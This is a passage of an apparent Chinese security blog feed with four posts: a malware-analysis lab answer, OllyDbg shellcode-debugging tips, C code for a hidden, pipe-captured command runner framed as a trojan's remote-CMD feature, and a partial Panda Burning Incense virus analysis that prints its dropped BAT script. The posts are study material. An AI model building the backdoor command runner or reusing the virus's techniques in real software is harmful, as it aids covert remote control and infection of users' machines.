href="#8-如何将DLL2-dll加载到IDA-PRO中，使得它与OD使用的加载地址匹配？" class="headerlink" title="8.如何将DLL2.dll加载到IDA PRO中，使得它与OD使用的加载地址匹配？"></a>8.如何将DLL2.dll加载到IDA PRO中，使得它与OD使用的加载地址匹配？</h3><p>可以在IDA里Edit–&gt;Segments–&gt;Rebase Program改变基址</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.18.png"></p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode的分析调试小技巧</title>
    <link href="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <url>/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h3 id="分析shellcode"><a href="#分析shellcode" class="headerlink" title="分析shellcode"></a>分析shellcode</h3><p>OD有一种简单的分析shellcode的方法。</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先是复制shellcode</p><p>这里我用自己写的弹窗小程序，并且使用十六进制编辑器WINHEX进行复制。</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>然后是打开OD，附加任意一个程序，打开内存映射窗口，快捷操作就是上面的M，然后寻找类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享），选择它。</p><p><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/1.png"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>选中一大片区域，然后将复制的数据粘贴进去<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/2.png"></p><p>可以右键选择反汇编，这样就会显示汇编代码，而不是十六进制数据，复制后如图所示。<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/3.png"></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>在反汇编窗口中跳到地址，可以在上面图中看到首地址是12D000，那么在反汇编窗口中跳到此地址，然后选择设置为新的EIP，这样就就可以开始调试shellcode了。</p><p><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/4.png"></p><p>调试到弹窗的地方<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/5.png"></p><p>这样可以方便调试shellcode，感觉还是很方便的。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《恶意代码分析实战》</p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>功能技术远程CMD</title>
    <link href="/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/"/>
    <url>/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/</url>
    
    <content type="html"><![CDATA[<h2 id="远程CMD"><a href="#远程CMD" class="headerlink" title="远程CMD"></a>远程CMD</h2><p>CMD，提示进行命令输入的一种工作提示符，在windows系统下，相当于在windows窗口使用的DOS系统，简单来讲，CMD就是通过命令行实现键鼠的操作。</p><p>现在介绍的远程CMD是指病毒木马获取控制端发送过来的CMD命令，执行后将结果回传给控制端。</p><p>有许多的API都可以实现CMD命令，比如WinExec,CreateProcess但是这些函数不能获取执行后的操作结果。所以实现远程CMD的关键是获取CMD的执行结果，接下来介绍如何执行CMD，并通过匿名管道的方法获取执行结果，实现远程CMD。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="CreatePipe"><a href="#CreatePipe" class="headerlink" title="CreatePipe"></a>CreatePipe</h3><p>创建一个匿名管道，并从中得到读写管道的句柄。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hReadPipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hWritePipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 nSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>hReadPipe：返回一个刻度管道数据的文件句柄。</p><p>hWritePipe：返回一个可写管道数据的文件句柄。</p><p>lpPipeAttributes：传入一个SECURITY_ATTRIBUTES结构的指针，该结构决定此函数返回的句柄是否可由子进程继承。如果传入为NUL，则不可进程。</p><p>nSize：指向管道的缓冲区大小。但是这仅仅是一个理想值，系统根据这个值创建大小相近的缓冲区。如果传入0，那么系统将使用一个默认的缓冲区大小。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值不为0；</p><p>如果函数失败，则返回值为0。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>管道是一种在进程间共享数据的机制，其实质是一段共享内存。windows系统为这段共享的内存设计使用数据流I/O的方式来访问。一个进程读，另一个进程写，这类似一个管道的两端。实现远程CMD的流程如下：</p><p>首先初始化匿名管道的安全属性结构SECURITY_ATTRIBUTES，调用CreatePipe函数创建匿名管道，获取管道数据读取句柄和管道数据写入句柄。</p><p>对即将创建的进程结构体STARTUPINFO进行初始化，隐藏进程窗口，并把上面的管道数据写入句柄赋值给新进程控制台窗口的缓存句柄，这样，新进程会把窗口缓存的输出数据写入到匿名管道中。</p><p>调用CreateProcess函数创建新的进程，执行CMD命令，并调用WaitForSingleObject等待命令执行完毕。执行完毕后，就调用ReadFile函数根据匿名管道的数据读取句柄从匿名管道的缓冲区中读取数据，这个数据就是命令的返回结果。</p><p>最后便可以关闭句柄，释放资源。</p><h2 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h2><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Windows</span>.</span></span>h&gt;<br>#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;<br>BOOL <span class="hljs-constructor">PipeCmd(<span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszCmd</span>, <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszResultBuffer</span>, DWORD <span class="hljs-params">dwBufferSize</span>)</span>;<br><span class="hljs-built_in">int</span> main<span class="hljs-literal">()</span><br>&#123;<br><span class="hljs-comment">//执行的CMD命令</span><br><span class="hljs-built_in">char</span> pszCmd<span class="hljs-literal">[]</span> = <span class="hljs-string">&quot;ping www.baidu.com&quot;</span>;<br><span class="hljs-built_in">char</span> pszResultBuffer<span class="hljs-literal">[<span class="hljs-number">1024</span>]</span> = &#123; <span class="hljs-number">0</span> &#125;;<br>DWORD dwBufferSize = <span class="hljs-number">1024</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-constructor">PipeCmd(<span class="hljs-params">pszCmd</span>, <span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>)</span><span class="hljs-operator"> == </span>TRUE)<br>&#123;<br>printf(<span class="hljs-string">&quot;执行成功:\n%s\n&quot;</span>,pszResultBuffer);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>printf(<span class="hljs-string">&quot;执行失败\n&quot;</span>);<br>&#125;<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br>return <span class="hljs-number">0</span>;<br>&#125;<br>BOOL <span class="hljs-constructor">PipeCmd(<span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszCmd</span>, <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszResultBuffer</span>, DWORD <span class="hljs-params">dwBufferSize</span>)</span><br>&#123;<br>HANDLE hReadPipe = NULL;<br>HANDLE hWritePipe = NULL;<br>SECURITY_ATTRIBUTES SEA = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL bRet = FALSE;<br>STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-comment">//设定管道的安全属性</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>bInheritHandle = TRUE;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>nLength = sizeof(SEA);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SEA</span>.</span></span>lpSecurityDescriptor = NULL;<br><span class="hljs-comment">//创建匿名管道</span><br>bRet = <span class="hljs-constructor">CreatePipe(&amp;<span class="hljs-params">hReadPipe</span>, &amp;<span class="hljs-params">hWritePipe</span>, &amp;SEA, 0)</span>;<br><span class="hljs-keyword">if</span> (bRet<span class="hljs-operator"> == </span>FALSE)<br>&#123;<br>printf(<span class="hljs-string">&quot;创建管道失败\n&quot;</span>);<br>return bRet;<br>&#125;<br><span class="hljs-comment">//设置新进程的参数</span><br>si.cb = sizeof(si);<br>si.hStdError = hWritePipe;<br>si.hStdOutput = hWritePipe;<br>si.wShowWindow = SW_HIDE;<br>si.dwFlags = STARTF_USESHOWWINDOW <span class="hljs-pattern-match">| <span class="hljs-constructor">STARTF_USESTDHANDLES</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>创建新进程执行<span class="hljs-constructor">CMD</span>命令</span><br><span class="hljs-pattern-match">b<span class="hljs-constructor">Ret</span> = <span class="hljs-constructor">CreateProcess(NULL, <span class="hljs-params">pszCmd</span>, NULL, NULL, TRUE, 0, NULL, NULL, &amp;<span class="hljs-params">si</span>, &amp;<span class="hljs-params">pi</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-keyword">if</span> (b<span class="hljs-constructor">Ret</span> <span class="hljs-operator">==</span> <span class="hljs-constructor">FALSE</span>)</span><br><span class="hljs-pattern-match">&#123;</span><br><span class="hljs-pattern-match">printf(&quot;创建进失败\n&quot;);</span><br><span class="hljs-pattern-match">return b<span class="hljs-constructor">Ret</span>;</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>等待执行结束</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">WaitForSingleObject(<span class="hljs-params">pi</span>.<span class="hljs-params">hThread</span>, INFINITE)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">WaitForSingleObject(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, INFINITE)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>从匿名管道中读取结果到输出缓冲区</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">RtlZeroMemory(<span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">ReadFile(<span class="hljs-params">hReadPipe</span>, <span class="hljs-params">pszResultBuffer</span>, <span class="hljs-params">dwBufferSize</span>, NULL, NULL)</span>;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>关闭句柄</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hThread</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hWritePipe</span>)</span>;</span><br><span class="hljs-pattern-match"><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hReadPipe</span>)</span>;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">return b<span class="hljs-constructor">Ret</span>;</span><br><span class="hljs-pattern-match">&#125;</span><br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>执行Ping baidu的命令，查看效果</p><p><img src="/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>功能技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>熊猫烧香病毒分析</title>
    <link href="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>熊猫烧香做为非常经典的病毒之一，可以说已经被分析烂了，网上也有许许多多的分析流程。作为病毒分析的一个初学者，我现在也尝试分析一下熊猫烧香，争取能够分析的比较清楚， 也能够学到一些东西。</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>样本的基本信息</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1.png"></p><h2 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h2><p>使用Process Monitor监控行为</p><p>可以看到panda.exe向C:\Windows\System32\drivers文件夹下释放了一个文件spcolsv.exe</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/2.png"></p><p>启动了spcolsv.exe这个进程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/3.png"></p><p>然后病毒的主体panda.exe将自身关闭</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/4.png"></p><p>spcolsv.exe进程中有大量的文件操作</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/5.png"></p><p>查看注册表的set操作，看到病毒在图中两个路径下设置了键值。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/6.png"></p><p>HKCU\Software\Microsoft\Windows\CurrentVersion\Run与自启动相关，病毒在其中设置键值，实现自启动。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/7.png"></p><p>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue这个键值主要是是否显示隐藏文件，当它为0时候，就是不显示隐藏的文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/8.png"></p><p>查看电脑上的文件时，会发现图标都被改成了熊猫烧香的图标。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/9.png"></p><p>现在大致清理一下思路，病毒主体为panda.exe，打开后，它会释放一个spcolsv.exe到C:\Windows\System32\drivers文件夹下，然后关闭自身，启动spcolsv.exe。spcolsv.exe有大量的文件操作，应该是和修改图标有关，同时还通过设置注册表键值，实现了自启动，和不显示隐藏的文件。</p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>首先进入函数，是两个解密的函数，解密后进行比较，如果字符串不相等就会退出程序。那么可以看到，病毒的实际操作就是在比较之后的三个函数内，操作1,2,3，现在具体进入其中进行分析。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/10.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/11.png"></p><h3 id="操作1"><a href="#操作1" class="headerlink" title="操作1"></a>操作1</h3><p>在这里主要是病毒的主体程序的运行和被感染的EXE程序的运行。</p><h4 id="病毒主体panda-exe和spcolsv-exe流程"><a href="#病毒主体panda-exe和spcolsv-exe流程" class="headerlink" title="病毒主体panda.exe和spcolsv.exe流程"></a>病毒主体panda.exe和spcolsv.exe流程</h4><p>判断当前病毒运行的目录下是否存在一个Desktop.ini文件，如果存在会将其删除。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/12.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/12-1.png"></p><p>继续往下走，会判断当前的程序是否是C:\Windows\system32\drives\spcolsv.exe，如果不是还会判断当前是否存在这个进程spcolsv.exe，如果存在将其关闭。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/16.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/17.png"></p><p>然后将自身复制到C:\Windows\system32\drives\spcolsv.exe，运行spcolsv.exe，再退出当前进程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/18.png"></p><p>下面来看一下如果是被感染的EXE文件会有哪些操作。</p><h4 id="被感染的EXE文件"><a href="#被感染的EXE文件" class="headerlink" title="被感染的EXE文件"></a>被感染的EXE文件</h4><p>如果是一个被感染的EXE文件，那么在这里进行了文件结尾的读取，一个文件被感染的话，结尾会多出一段数据</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/15.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/13.png"></p><p>被感染文件结尾的标识</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/19.png"></p><p>如果此时是一个被感染的EXE文件，此时比较的结果如下图所示。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/14.png"></p><p>被感染文件，在这里会进行跳转，可以看到此时eax值是文件结尾标识的大小，结尾标识如上图，0x17=23。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/20.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/21.png"></p><p>之后会创建一个原文件名后面加上.exe的文件</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/22.png"></p><p>然后会在C:\Users\admin\AppData\Local\Temp下创建一个BAT文件，并且执行这个BAT文件，并且判断当前是否存在spcolsv.exe进程，存在的话将其关闭，然后会将病毒文件分离出来，复制到C:\Windows\system32\drives\spcolsv.exe，然后运行它，自身退出。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/23.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/25.png"></p><p>执行这个BAT文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/24.png"></p><p>查看bat文件的内容</p><figure class="highlight ceylon"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ceylon">:<span class="hljs-keyword">try</span><span class="hljs-number">1</span><br>del <span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span><br><span class="hljs-keyword">if</span> exist <span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span> goto <span class="hljs-keyword">try</span><span class="hljs-number">1</span><br>ren <span class="hljs-string">&quot;C:\1\aaa.exe.exe&quot;</span> <span class="hljs-string">&quot;aaa.exe&quot;</span><br><span class="hljs-keyword">if</span> exist <span class="hljs-string">&quot;C:\1\aaa.exe.exe&quot;</span> goto <span class="hljs-keyword">try</span><span class="hljs-number">2</span><br><span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span><br>:<span class="hljs-keyword">try</span><span class="hljs-number">2</span><br>del %<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>操作1到这里基本就结束了，panda.exe会将自身复制到驱动目录下，命名为spcolsv.exe，然后以spcolsv.exe继续运行。如果是被感染的exe文件，会先创建一个BAT文件，用于执行原程序，然后将病毒主体分离出来，继续运行。只要当前电脑上还存在一个被感染的exe文件，那么病毒就永远不会被清除。</p><h3 id="操作2"><a href="#操作2" class="headerlink" title="操作2"></a>操作2</h3><p>进入操作2，其中有三个函数，分开来看这三个函数。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/26.png"></p><h4 id="函数1，sub-40A7EC"><a href="#函数1，sub-40A7EC" class="headerlink" title="函数1，sub_40A7EC"></a>函数1，sub_40A7EC</h4><p>这里创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/27.png"></p><p>下断分析这里，这里获取了所有的磁盘，然后开始进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/28.png"></p><p>getDriveType（sub_4076B4)函数，遍历所有的盘符，从A到Z，然后保存起来，以便后续进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/29.png"></p><p>感染函数中，开始进行文件的搜索，搜索当前盘符下所有的文件，比如C盘，就是C:\*.*，关于文件搜索的一些内容可以查看这里<a href="https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/">文件遍历</a>。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/30.png"></p><p>如果是文件夹的话还要进行判断，排除了一些系统的目录，本身目录和上级目录”.”，”..”。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/31.png"></p><p>然后会判断当前目录中是否存在desktop.ini文件，如果不存在则会创建一个，向其中写入年月日。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/33.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/32.png"></p><p>存在的话就会判断其中的时间是否与当前时间相等，如果相等，则判断当前文件已经被感染就会跳过，如果不相等则继续感染，修改文件中的时间。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/34.png"></p><p>然后就是对于文件的操作，判断文件的类型执行相应的操作。如果是.GHO文件，也就是备份文件，就会将其删除。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/35.png"></p><p>获取文件的大小，如果文件大小超过0xA00000就不再继续感染，如果文件名字是setup.exe和NTDETECT.COM也不进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/36.png"></p><p>获取扩展名然后判断是否等于exe,scr,pid,com，如果是这几种文件类型就会执行40800C函数进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/37.png"></p><p>然后是网页类型文件是否是htm，html，asp，php，jsp，aspx，如果是这几种类型就会执行407ADC函数进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/38.png"></p><p>现在来着重看一下可执行文件与网页文件的感染方式。</p><h5 id="网页文件感染方式（sub-407ADC）"><a href="#网页文件感染方式（sub-407ADC）" class="headerlink" title="网页文件感染方式（sub_407ADC）"></a>网页文件感染方式（sub_407ADC）</h5><p>对于这类文件主要是在原文件的后面加上一个新的标签，其感染过程如下，它会读取文件内容，然后通过比较文件内容，看当前文件是否已经存在感染的标签判断其是否被感染过</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/39.png"></p><p>之后会进行感染，在文件的末尾加上一个iframe标签</p><figure 